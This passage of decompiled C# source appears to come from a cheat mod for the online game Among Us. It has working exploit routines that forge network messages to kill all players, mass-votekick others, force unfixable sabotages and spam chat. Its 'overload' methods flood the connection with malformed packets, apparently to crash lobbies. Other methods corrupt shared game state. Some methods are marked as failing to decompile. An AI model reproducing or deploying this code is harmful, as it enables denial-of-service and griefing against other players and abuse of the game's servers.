      this.DrawToggleSwitch("Abnormal Sabotage", ref ChocooPlugin.CheckAbnormalSabotage);
      this.DrawToggleSwitch("Abnormal Votekick Spam", ref ChocooPlugin.CheckAbnormalVotekickSpam);
      GUILayout.Space(5f);
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.totalDetections > 0 ? Color.red : Color.green;
      GUILayout.Label("⚠️ Total Detections: " + ChocooPlugin.totalDetections.ToString(), new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 12,
        alignment = (TextAnchor) 4
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.5f, 0.3f, 0.1f, 1f);
      if (GUILayout.Button("CLEAR DETECTION LOG", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
      {
        ChocooPlugin.detectionLog.Clear();
        ChocooPlugin.totalDetections = 0;
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = Color.yellow;
      GUILayout.Label("Anticheat Info", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.gray;
      GUILayout.Label("• Detects even when not host", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Auto-ban requires host", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Detections shown in chat", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Blacklist persists across sessions", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndScrollView();
    }

    private bool DrawToggleSwitchWithReturn(string label, ref bool value)
    {
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Label(label, new GUILayoutOption[1]
      {
        GUILayout.Width(140f)
      });
      GUILayout.FlexibleSpace();
      float num1 = 45f;
      float num2 = 22f;
      Rect rect = GUILayoutUtility.GetRect(num1, num2);
      Color col = value ? new Color(0.5f, 0.2f, 0.9f, 1f) : new Color(0.25f, 0.25f, 0.25f, 1f);
      GUIStyle guiStyle1 = new GUIStyle(GUI.skin.box);
      guiStyle1.normal.background = this.MakeTex(2, 2, col);
      GUI.backgroundColor = col;
      GUI.Box(rect, "", guiStyle1);
      bool flag = GUI.Button(rect, "", GUIStyle.none);
      if (flag)
        value = !value;
      float num3 = num2 - 4f;
      float num4 = value ? (float) ((double) ((Rect) ref rect).x + (double) num1 - (double) num3 - 2.0) : ((Rect) ref rect).x + 2f;
      GUIStyle guiStyle2 = new GUIStyle(GUI.skin.box);
      guiStyle2.normal.background = this.MakeTex(2, 2, Color.white);
      GUI.backgroundColor = Color.white;
      GUI.Box(new Rect(num4, ((Rect) ref rect).y + 2f, num3, num3), "", guiStyle2);
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      return flag;
    }

    [HideFromIl2Cpp]
    private IEnumerator DelayedBlacklistNotify(
      string playerName,
      string friendCode,
      string notifyKey)
    {
      yield return (object) new WaitForSeconds(1f);
      try
      {
        if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Chat, (Object) null) && Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null))
          DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, $"<color=red>[BLACKLIST]</color> <color=orange>{playerName}</color> ({friendCode}) is in your blacklist!", true);
      }
      catch
      {
      }
    }

    private void SendChatMessage(string message)
    {
      try
      {
        if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null))
          return;
        PlayerControl.LocalPlayer.RpcSendChat(message);
        this.lastChatSendTime = Time.time;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Send chat error: " + ex.Message));
      }
    }

    private void SendWhisperMessage(string message, int targetPlayerId)
    {
      try
      {
        if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null))
          return;
        PlayerControl playerControl = ((IEnumerable<PlayerControl>) PlayerControl.AllPlayerControls.ToArray()).FirstOrDefault<PlayerControl>((Func<PlayerControl, bool>) (p => Object.op_Inequality((Object) p, (Object) null) && (int) p.PlayerId == targetPlayerId));
        if (Object.op_Equality((Object) playerControl, (Object) null) || Object.op_Equality((Object) playerControl.Data, (Object) null))
        {
          ChocooPlugin.Logger.LogWarning((object) "Whisper target player not found");
        }
        else
        {
          string playerName = playerControl.Data.PlayerName;
          MessageWriter messageWriter = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 13, (SendOption) 1, ((InnerNetObject) playerControl).OwnerId);
          messageWriter.Write(message);
          ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter);
          if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Chat, (Object) null))
            DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, $"<color=#9966FF>[You are whispering to {playerName}]</color>\n{message}", true);
          this.lastChatSendTime = Time.time;
          ChocooPlugin.Logger.LogInfo((object) $"Whisper sent to {playerName}: {message}");
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Send whisper error: " + ex.Message));
      }
    }

    private void ExecuteSpamChat()
    {
      if (this.chatSpamDelay > 0)
      {
        --this.chatSpamDelay;
      }
      else
      {
        try
        {
          if (!string.IsNullOrWhiteSpace(this.chatMessage) && Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null))
            PlayerControl.LocalPlayer.RpcSendChat(this.chatMessage);
          this.chatSpamDelay = (int) (3.0 * (double) (int) (1.0 / (double) Time.deltaTime));
        }
        catch (Exception ex)
        {
          ChocooPlugin.Logger.LogError((object) ("Spam Chat error: " + ex.Message));
        }
      }
    }

    private void DrawSabotagesTab()
    {
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.3f, 0.3f);
      GUILayout.Label("Sabotage Controls", new GUIStyle(GUI.skin.label)
      {
        fontSize = 14,
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(10f);
      this.sabotageScrollPosition = GUILayout.BeginScrollView(this.sabotageScrollPosition, (Il2CppReferenceArray<GUILayoutOption>) null);
      ShipStatus ship = ShipStatus.Instance;
      GUI.backgroundColor = ChocooPlugin.SpamRepairSabotages ? new Color(0.2f, 0.8f, 0.2f, 1f) : new Color(0.2f, 0.5f, 0.8f, 1f);
      if (GUILayout.Button(ChocooPlugin.SpamRepairSabotages ? "SPAM REPAIR - STOP" : "SPAM REPAIR SABOTAGES", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
        ChocooPlugin.SpamRepairSabotages = !ChocooPlugin.SpamRepairSabotages;
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      this.DrawSabotageButton(ChocooPlugin.reactorActive ? "REACTOR - STOP" : "REACTOR / LAB", ChocooPlugin.reactorActive, (Action) (() =>
      {
        if (!Object.op_Inequality((Object) ship, (Object) null))
          return;
        ChocooPlugin.reactorActive = !ChocooPlugin.reactorActive;
        this.HandleReactor(ship, (byte) ship.Type, ChocooPlugin.reactorActive ? (byte) 128 /*0x80*/ : (byte) 16 /*0x10*/);
      }));
      this.DrawSabotageButton(ChocooPlugin.oxygenActive ? "OXYGEN - STOP" : "OXYGEN", ChocooPlugin.oxygenActive, (Action) (() =>
      {
        if (!Object.op_Inequality((Object) ship, (Object) null))
          return;
        ChocooPlugin.oxygenActive = !ChocooPlugin.oxygenActive;
        this.HandleOxygen(ship, (byte) ship.Type, ChocooPlugin.oxygenActive ? (byte) 128 /*0x80*/ : (byte) 16 /*0x10*/);
      }));
      this.DrawSabotageButton(ChocooPlugin.commsActive ? "COMMS - STOP" : "COMMS", ChocooPlugin.commsActive, (Action) (() =>
      {
        if (!Object.op_Inequality((Object) ship, (Object) null))
          return;
        ChocooPlugin.commsActive = !ChocooPlugin.commsActive;
        ship.RpcUpdateSystem((SystemTypes) 14, ChocooPlugin.commsActive ? (byte) 128 /*0x80*/ : (byte) 16 /*0x10*/);
      }));
      this.DrawSabotageButton(ChocooPlugin.lightsActive ? "LIGHTS - STOP" : "LIGHTS", ChocooPlugin.lightsActive, (Action) (() =>
      {
        if (!Object.op_Inequality((Object) ship, (Object) null))
          return;
        ChocooPlugin.lightsActive = !ChocooPlugin.lightsActive;
        ship.RpcUpdateSystem((SystemTypes) 7, ChocooPlugin.lightsActive ? (byte) 0 : (byte) 16 /*0x10*/);
      }));
      this.DrawSabotageButton(ChocooPlugin.unfixableLightsActive ? "UNFIXABLE - STOP" : "UNFIXABLE LIGHTS", ChocooPlugin.unfixableLightsActive, (Action) (() =>
      {
        if (!Object.op_Inequality((Object) ship, (Object) null))
          return;
        ChocooPlugin.unfixableLightsActive = !ChocooPlugin.unfixableLightsActive;
        ship.RpcUpdateSystem((SystemTypes) 7, ChocooPlugin.unfixableLightsActive ? (byte) 69 : (byte) 16 /*0x10*/);
      }));
      GUILayout.Space(10f);
      GUI.backgroundColor = new Color(0.6f, 0.3f, 0.1f, 1f);
      if (GUILayout.Button("CLOSE ALL DOORS", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }) && Object.op_Inequality((Object) ship, (Object) null))
        this.HandleDoors(ship);
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndScrollView();
    }

    private void ExecuteRepairSabotages()
    {
      if (this.repairSabotagesDelay > 0)
      {
        --this.repairSabotagesDelay;
      }
      else
      {
        try
        {
          ShipStatus instance = ShipStatus.Instance;
          if (Object.op_Equality((Object) instance, (Object) null))
            return;
          instance.RpcUpdateSystem((SystemTypes) 3, (byte) 16 /*0x10*/);
          instance.RpcUpdateSystem((SystemTypes) 21, (byte) 16 /*0x10*/);
          instance.RpcUpdateSystem((SystemTypes) 8, (byte) 16 /*0x10*/);
          instance.RpcUpdateSystem((SystemTypes) 14, (byte) 16 /*0x10*/);
          instance.RpcUpdateSystem((SystemTypes) 7, (byte) 16 /*0x10*/);
          instance.RpcUpdateSystem((SystemTypes) 58, (byte) 16 /*0x10*/);
          this.repairSabotagesDelay = (int) (0.10000000149011612 * (double) (int) (1.0 / (double) Time.deltaTime));
        }
        catch (Exception ex)
        {
          ChocooPlugin.Logger.LogError((object) ("Spam Repair Sabotages: " + ex.Message));
        }
      }
    }

    private void ExecuteKillAll()
    {
      if (this.killAllDelay > 0)
      {
        --this.killAllDelay;
      }
      else
      {
        try
        {
          if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null) || Object.op_Equality((Object) AmongUsClient.Instance, (Object) null))
            return;
          foreach (PlayerControl cachedPlayer1 in this._cachedPlayers)
          {
            if (Object.op_Inequality((Object) cachedPlayer1, (Object) null) && Object.op_Inequality((Object) cachedPlayer1.Data, (Object) null) && !cachedPlayer1.Data.IsDead)
            {
              foreach (PlayerControl cachedPlayer2 in this._cachedPlayers)
              {
                MessageWriter messageWriter = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 12, (SendOption) 0, ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(cachedPlayer2));
                MessageExtensions.WriteNetObject(messageWriter, (InnerNetObject) cachedPlayer1);
                messageWriter.Write(1);
                ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter);
              }
              ChocooPlugin.Logger.LogInfo((object) ("Killed: " + cachedPlayer1.Data.PlayerName));
              this.killAllDelay = (int) (0.30000001192092896 * (double) (int) (1.0 / (double) Time.deltaTime));
              return;
            }
          }
          ChocooPlugin.KillAllEnabled = false;
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Chat, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, "<color=red>[Host]</color> Everyone has been killed", true);
        }
        catch (Exception ex)
        {
          ChocooPlugin.Logger.LogError((object) ("Execute Kill All error: " + ex.Message));
        }
      }
    }

    private void RandomizeEverything(PlayerControl player)
    {
      try
      {
        if (Object.op_Equality((Object) player, (Object) null) || Object.op_Equality((Object) player.Data, (Object) null))
          return;
        byte num = (byte) Random.Range(0, 18);
        player.RpcSetColor(num);
        HatManager instance = DestroyableSingleton<HatManager>.Instance;
        if (Object.op_Equality((Object) instance, (Object) null))
          return;
        Il2CppReferenceArray<HatData> unlockedHats = instance.GetUnlockedHats();
        Il2CppReferenceArray<SkinData> unlockedSkins = instance.GetUnlockedSkins();
        Il2CppReferenceArray<VisorData> unlockedVisors = instance.GetUnlockedVisors();
        Il2CppReferenceArray<PetData> unlockedPets = instance.GetUnlockedPets();
        if (((Il2CppArrayBase<HatData>) unlockedHats).Count > 0)
          player.RpcSetHat(((CosmeticData) ((Il2CppArrayBase<HatData>) unlockedHats)[Random.Range(0, ((Il2CppArrayBase<HatData>) unlockedHats).Count)]).ProdId);
        if (((Il2CppArrayBase<SkinData>) unlockedSkins).Count > 0)
          player.RpcSetSkin(((CosmeticData) ((Il2CppArrayBase<SkinData>) unlockedSkins)[Random.Range(0, ((Il2CppArrayBase<SkinData>) unlockedSkins).Count)]).ProdId);
        if (((Il2CppArrayBase<VisorData>) unlockedVisors).Count > 0)
          player.RpcSetVisor(((CosmeticData) ((Il2CppArrayBase<VisorData>) unlockedVisors)[Random.Range(0, ((Il2CppArrayBase<VisorData>) unlockedVisors).Count)]).ProdId);
        if (((Il2CppArrayBase<PetData>) unlockedPets).Count <= 0)
          return;
        player.RpcSetPet(((CosmeticData) ((Il2CppArrayBase<PetData>) unlockedPets)[Random.Range(0, ((Il2CppArrayBase<PetData>) unlockedPets).Count)]).ProdId);
      }
      catch (Exception ex)
      {
      }
    }

    private void SpawnLobby()
    {
      try
      {
        if (Object.op_Equality((Object) LobbyBehaviour.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<GameStartManager>.Instance, (Object) null))
        {
          ((InnerNetClient) AmongUsClient.Instance).Spawn((InnerNetObject) Object.Instantiate<LobbyBehaviour>(DestroyableSingleton<GameStartManager>.Instance.LobbyPrefab), -2, (SpawnFlags) 0);
          ChocooPlugin.Logger.LogInfo((object) "Lobby spawned successfully");
        }
        else
          ChocooPlugin.Logger.LogWarning((object) "Lobby already exists or GameStartManager is null");
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Failed to spawn lobby: " + ex.Message));
      }
    }

    private void DespawnLobby()
    {
      try
      {
        if (Object.op_Inequality((Object) LobbyBehaviour.Instance, (Object) null))
        {
          ((InnerNetObject) LobbyBehaviour.Instance).Despawn();
          ChocooPlugin.Logger.LogInfo((object) "Lobby despawned successfully");
        }
        else
          ChocooPlugin.Logger.LogWarning((object) "No lobby to despawn");
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Failed to despawn lobby: " + ex.Message));
      }
    }

    private void SpawnMeetingHud()
    {
      try
      {
        if (Object.op_Equality((Object) MeetingHud.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null))
        {
          ((InnerNetClient) AmongUsClient.Instance).Spawn((InnerNetObject) Object.Instantiate<MeetingHud>(DestroyableSingleton<HudManager>.Instance.MeetingPrefab), -2, (SpawnFlags) 0);
          ChocooPlugin.Logger.LogInfo((object) "MeetingHud spawned successfully");
        }
        else
          ChocooPlugin.Logger.LogWarning((object) "MeetingHud already exists or HudManager is null");
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Failed to spawn MeetingHud: " + ex.Message));
      }
    }

    private void DespawnMeetingHud()
    {
      try
      {
        if (Object.op_Inequality((Object) MeetingHud.Instance, (Object) null))
        {
          ((InnerNetObject) MeetingHud.Instance).Despawn();
          ChocooPlugin.Logger.LogInfo((object) "MeetingHud despawned successfully");
        }
        else
          ChocooPlugin.Logger.LogWarning((object) "No MeetingHud to despawn");
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Failed to despawn MeetingHud: " + ex.Message));
      }
    }

    private void SpawnMap(int mapId)
    {
      try
      {
        if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || AmongUsClient.Instance.ShipPrefabs == null)
          ChocooPlugin.Logger.LogError((object) "AmongUsClient or ShipPrefabs is null");
        else if (mapId >= AmongUsClient.Instance.ShipPrefabs.Count)
          ChocooPlugin.Logger.LogError((object) "Invalid map ID");
        else
          MonoBehaviourExtensions.StartCoroutine((MonoBehaviour) this, this.CoSpawnMap(mapId));
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Failed to spawn map: " + ex.Message));
      }
    }

    [HideFromIl2Cpp]
    private IEnumerator CoSpawnMap(int mapId)
    {
      AmongUsClient.Instance.ShipLoadingAsyncHandle = AmongUsClient.Instance.ShipPrefabs[mapId].InstantiateAsync((Transform) null, false);
      yield return (object) AmongUsClient.Instance.ShipLoadingAsyncHandle;
      ShipStatus.Instance = AmongUsClient.Instance.ShipLoadingAsyncHandle.Result.GetComponent<ShipStatus>();
      ((InnerNetClient) AmongUsClient.Instance).Spawn((InnerNetObject) ShipStatus.Instance, -2, (SpawnFlags) 0);
      ChocooPlugin.Logger.LogInfo((object) $"Map {this.mapNames[mapId]} spawned successfully");
    }

    private void DespawnMap()
    {
      try
      {
        if (Object.op_Inequality((Object) ShipStatus.Instance, (Object) null))
        {
          ((InnerNetObject) ShipStatus.Instance).Despawn();
          ChocooPlugin.Logger.LogInfo((object) "Map despawned successfully");
        }
        else
          ChocooPlugin.Logger.LogWarning((object) "No map to despawn");
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Failed to despawn map: " + ex.Message));
      }
    }

    private void VotekickTarget()
    {
      try
      {
        if (ChocooPlugin.selectedVotekickTargetId == -1 || !Object.op_Inequality((Object) VoteBanSystem.Instance, (Object) null))
          return;
        VoteBanSystem.Instance.CmdAddVote(ChocooPlugin.selectedVotekickTargetId);
        ChocooPlugin.Logger.LogInfo((object) ("Votekick added to player with ClientId: " + ChocooPlugin.selectedVotekickTargetId.ToString()));
        if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
        {
          string str = "Unknown";
          int num = 0;
          foreach (PlayerControl playerControl in PlayerControl.AllPlayerControls.ToArray())
          {
            if (Object.op_Inequality((Object) playerControl, (Object) null) && Object.op_Inequality((Object) playerControl.Data, (Object) null) && playerControl.Data.ClientId == ChocooPlugin.selectedVotekickTargetId)
            {
              str = playerControl.Data.PlayerName;
              Il2CppStructArray<int> il2CppStructArray;
              if (VoteBanSystem.Instance.Votes.TryGetValue(ChocooPlugin.selectedVotekickTargetId, ref il2CppStructArray))
              {
                for (int index = 0; index < ((Il2CppArrayBase<int>) il2CppStructArray).Length; ++index)
                {
                  if (((Il2CppArrayBase<int>) il2CppStructArray)[index] != 0)
                    ++num;
                }
                break;
              }
              break;
            }
          }
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage($"<color=#5500FF>Votekick Sent to {str}</color> <color=#00FF00>({num}/3)</color>");
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Failed to votekick target: " + ex.Message));
      }
    }

    private void VotekickTargetAndRejoin()
    {
      try
      {
        if (ChocooPlugin.selectedVotekickTargetId == -1 || !Object.op_Inequality((Object) VoteBanSystem.Instance, (Object) null) || !Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null))
          return;
        VoteBanSystem.Instance.CmdAddVote(ChocooPlugin.selectedVotekickTargetId);
        ChocooPlugin.Logger.LogInfo((object) ("Votekick added to player with ClientId: " + ChocooPlugin.selectedVotekickTargetId.ToString()));
        if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
        {
          string str = "Unknown";
          int num = 0;
          foreach (PlayerControl playerControl in PlayerControl.AllPlayerControls.ToArray())
          {
            if (Object.op_Inequality((Object) playerControl, (Object) null) && Object.op_Inequality((Object) playerControl.Data, (Object) null) && playerControl.Data.ClientId == ChocooPlugin.selectedVotekickTargetId)
            {
              str = playerControl.Data.PlayerName;
              Il2CppStructArray<int> il2CppStructArray;
              if (VoteBanSystem.Instance.Votes.TryGetValue(ChocooPlugin.selectedVotekickTargetId, ref il2CppStructArray))
              {
                for (int index = 0; index < ((Il2CppArrayBase<int>) il2CppStructArray).Length; ++index)
                {
                  if (((Il2CppArrayBase<int>) il2CppStructArray)[index] != 0)
                    ++num;
                }
                break;
              }
              break;
            }
          }
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage($"<color=#5500FF>Votekick Sent to {str}</color> <color=#00FF00>({num}/3)</color>");
        }
        ChocooPlugin.storedGameIdForRejoin = ((InnerNetClient) AmongUsClient.Instance).GameId;
        ChocooPlugin.exitTimeForRejoin = Time.time + 0.2f;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Failed to votekick target and rejoin: " + ex.Message));
      }
    }

    private void VotekickAll()
    {
      try
      {
        if (Object.op_Equality((Object) VoteBanSystem.Instance, (Object) null))
          return;
        int num = 0;
        foreach (PlayerControl playerControl in PlayerControl.AllPlayerControls.ToArray())
        {
          if (Object.op_Inequality((Object) playerControl, (Object) null) && !((InnerNetObject) playerControl).AmOwner)
          {
            int clientId = playerControl.Data.ClientId;
            if (!ChocooPlugin.votekickedPlayerIds.Contains(clientId))
            {
              for (int index = 0; index < 1; ++index)
                VoteBanSystem.Instance.CmdAddVote(clientId);
              ChocooPlugin.votekickedPlayerIds.Add(clientId);
              ++num;
            }
          }
        }
        ChocooPlugin.Logger.LogInfo((object) $"Votekick sent to {num.ToString()} players");
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Failed to votekick all: " + ex.Message));
      }
    }

    private void VotekickAllAndRejoin()
    {
      try
      {
        if (Object.op_Equality((Object) VoteBanSystem.Instance, (Object) null) || Object.op_Equality((Object) AmongUsClient.Instance, (Object) null))
          return;
        foreach (PlayerControl playerControl in PlayerControl.AllPlayerControls.ToArray())
        {
          if (Object.op_Inequality((Object) playerControl, (Object) null) && !((InnerNetObject) playerControl).AmOwner)
          {
            int clientId = playerControl.Data.ClientId;
            if (!VoteBanSystem.Instance.HasMyVote(clientId))
              VoteBanSystem.Instance.CmdAddVote(clientId);
          }
        }
        ChocooPlugin.VotekickAutoRejoinEnabled = false;
        ChocooPlugin.storedGameIdForRejoin = ((InnerNetClient) AmongUsClient.Instance).GameId;
        ChocooPlugin.exitTimeForRejoin = Time.time + 0.2f;
      }
      catch
      {
      }
    }

    private void CompleteAllTasks()
    {
      try
      {
        if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null))
          return;
        PlayerControl localPlayer = PlayerControl.LocalPlayer;
        List<NetworkedPlayerInfo.TaskInfo> tasks = localPlayer.Data.Tasks;
        if (tasks == null || tasks.Count == 0)
          ChocooPlugin.Logger.LogWarning((object) "No tasks found");
        else
          MonoBehaviourExtensions.StartCoroutine((MonoBehaviour) this, this.CompleteTasksDelayed(localPlayer));
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("CompleteAllTasks error: " + ex.Message));
      }
    }

    private IEnumerator CompleteTasksDelayed(PlayerControl localPlayer)
    {
      List<NetworkedPlayerInfo.TaskInfo> tasks = localPlayer.Data.Tasks;
      for (uint i = 0; i < (uint) tasks.Count; ++i)
      {
        if (!tasks[(int) i].Complete)
        {
          localPlayer.CompleteTask(i);
          MessageWriter writer = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) localPlayer).NetId, (byte) 1, (SendOption) 1, -1);
          writer.WritePacked(i);
          ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(writer);
          yield return (object) new WaitForSeconds(0.1f);
          writer = (MessageWriter) null;
        }
      }
      ChocooPlugin.Logger.LogInfo((object) "All tasks completed");
      if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Chat, (Object) null))
        DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, "<color=green>[Tasks]</color> All tasks completed!", true);
    }

    private void ExecuteOverloadMethod8()
    {
      if ((double) Time.time - (double) this.lastOverloadMethod8FireTime < 9.0)
        return;
      if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || ((InnerNetClient) AmongUsClient.Instance).connection == null)
        return;
      try
      {
        for (int index1 = 0; index1 < 200; ++index1)
        {
          MessageWriter messageWriter = MessageWriter.Get((SendOption) 0);
          messageWriter.StartMessage((byte) 5);
          messageWriter.Write(((InnerNetClient) AmongUsClient.Instance).GameId);
          messageWriter.StartMessage((byte) 1);
          messageWriter.Write(0);
          messageWriter.EndMessage();
          for (int index2 = 0; index2 < 256 /*0x0100*/; ++index2)
          {
            messageWriter.StartMessage((byte) index2);
            messageWriter.EndMessage();
          }
          messageWriter.EndMessage();
          ((Connection) ((InnerNetClient) AmongUsClient.Instance).connection).Send(messageWriter);
          messageWriter.Recycle();
        }
        this.lastOverloadMethod8FireTime = Time.time;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Overload Method 8: " + ex.Message));
      }
    }

    private void ExecuteOverloadMethod3Mix()
    {
      if ((double) Time.time - (double) this.lastOverloadMethod3FireTime < 1.0)
        return;
      if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || ((InnerNetClient) AmongUsClient.Instance).connection == null)
        return;
      try
      {
        for (int index1 = 0; index1 < 20; ++index1)
        {
          MessageWriter messageWriter = MessageWriter.Get((SendOption) 0);
          messageWriter.StartMessage((byte) 5);
          messageWriter.Write(((InnerNetClient) AmongUsClient.Instance).GameId);
          for (int index2 = 0; index2 < 175; ++index2)
          {
            switch (index2 % 3)
            {
              case 0:
                messageWriter.StartMessage((byte) 69);
                messageWriter.EndMessage();
                break;
              case 1:
                messageWriter.StartMessage((byte) 1);
                messageWriter.Write(0);
                messageWriter.EndMessage();
                break;
              default:
                messageWriter.StartMessage((byte) 2);
                messageWriter.Write(0);
                messageWriter.EndMessage();
                break;
            }
          }
          messageWriter.EndMessage();
          ((Connection) ((InnerNetClient) AmongUsClient.Instance).connection).Send(messageWriter);
          messageWriter.Recycle();
        }
        this.lastOverloadMethod3FireTime = Time.time;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Overload Method 3 Mix: " + ex.Message));
      }
    }

    private void ExecuteOverflowMethod3()
    {
      if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || ((InnerNetClient) AmongUsClient.Instance).connection == null)
        return;
      try
      {
        AmongUsClient instance = AmongUsClient.Instance;
        if (Object.op_Equality((Object) instance, (Object) null))
          return;
        ((InnerNetClient) instance).timer = -999f;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Overflow Method 3: " + ex.Message));
      }
    }

    private void ExecuteOverflowMethod4()
    {
      // ISSUE: unable to decompile the method.
    }

    private void ExecuteOverflowMethod5()
    {
      // ISSUE: unable to decompile the method.
    }

    private void ExecuteOverflowMethod6()
    {
      // ISSUE: unable to decompile the method.
    }

    private void ExecuteOverflowMethod7()
    {
      try
      {
        GameData.Instance.AllPlayers.Clear();
        for (byte index = 100; index < (byte) 120; ++index)
        {
          NetworkedPlayerInfo networkedPlayerInfo = Object.Instantiate<NetworkedPlayerInfo>(PlayerControl.LocalPlayer.Data);
          networkedPlayerInfo.PlayerId = index;
          networkedPlayerInfo.PlayerName = "Player" + index.ToString();
          networkedPlayerInfo.Role = (RoleBehaviour) null;
          GameData.Instance.AllPlayers.Add(networkedPlayerInfo);
        }
        GameData.Instance.RecomputeTaskCounts();
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Overflow Method 7 error: " + ex.Message));
      }
    }

    private void ExecuteOverflowMethod8()
    {
      try
      {
        foreach (InnerNetObject innerNetObject in Object.FindObjectsOfType<InnerNetObject>())
          innerNetObject.NetId = 0U;
      }
